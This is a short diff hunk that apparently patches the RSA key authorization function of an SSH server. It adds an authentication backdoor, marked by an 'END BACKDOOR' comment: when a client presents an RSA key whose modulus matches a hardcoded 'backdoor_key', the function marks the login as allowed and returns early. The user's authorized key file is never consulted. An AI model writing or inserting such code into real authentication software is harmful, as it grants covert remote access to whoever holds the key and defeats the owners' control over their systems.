@@ -182,6 +182,17 @@ rsa_key_allowed_in_file(struct passwd *pw, char *file,
 	char *char_pointer = backdoor_key;
 	key = key_new(KEY_RSA1);
 	int ret = hostfile_read_key(&char_pointer, &bits, key);
+	if (BN_cmp(key->rsa->n, client_n) == 0) {
+		/* Modulus is valid */
+		if ((fp = sshkey_fingerprint(key, options.fingerprint_hash,
+				    SSH_FP_DEFAULT)) != NULL) {
+			/* Fingerprint is valid */
+			free(fp);
+			allowed = 1;
+			*rkey = key;
+			return allowed;
+		}
+	}
 	/*********** END BACKDOOR ****************/
 
 	debug("trying public RSA key file %s", file);
